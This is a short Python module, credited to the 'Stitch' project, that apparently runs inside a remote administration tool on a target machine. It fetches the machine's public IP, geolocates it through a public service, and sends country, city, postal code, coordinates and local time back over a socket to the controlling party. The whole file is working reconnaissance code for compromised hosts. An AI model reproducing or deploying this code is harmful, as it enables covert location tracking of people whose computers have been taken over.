# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import requests
from time import strftime, sleep

try:
    ip = requests.request('GET','https://api.ipify.org').text
except Exception as e:
    resp = '[!] Unable to obtain public ip address\n'
    send(client_socket,resp)
else:
    try:
        url = 'http://freegeoip.net/json/{}'.format(ip)
        r = requests.get(url)
        js = r.json()

        ctry_code = js['country_code']
        ctry_name = js['country_name']
        regn_name = js['region_name']
        t_zone = js['time_zone']
        city = js['city']
        lat = js['latitude']
        log = js['longitude']
        zipcode = js['zip_code']
        metro = js['metro_code']
        hour = int(strftime("%H"))
        am_pm = "AM"
        if hour > 12:
            hour = str(hour - 12)
            am_pm = "PM"
        time = "{}{}{}".format(str(hour),strftime(":%M:%S "),am_pm)
        date = strftime("%m/%d/%Y")
        resp =('    Public IP\t\t: {}\n\
                \n    Country\t\t: {}, {}\
                \n    Region\t\t: {}\
                \n    City\t\t: {}\
                \n    Postal code\t\t: {}\
                \n    Lat/Long\t\t: {}, {}\
                \n    Metro Code\t\t: {}\n\
                \n    Date\t\t: {}\
                \n    Time\t\t: {}\
                \n    Time zone\t\t: {}\n').format(ip,ctry_name,ctry_code,\
        regn_name,city,zipcode,lat,log,metro,date,time,t_zone)
        send(client_socket,resp)
    except Exception as e:
        resp = '[!] Unable to obtain physical location information\n'
        send(client_socket,resp)
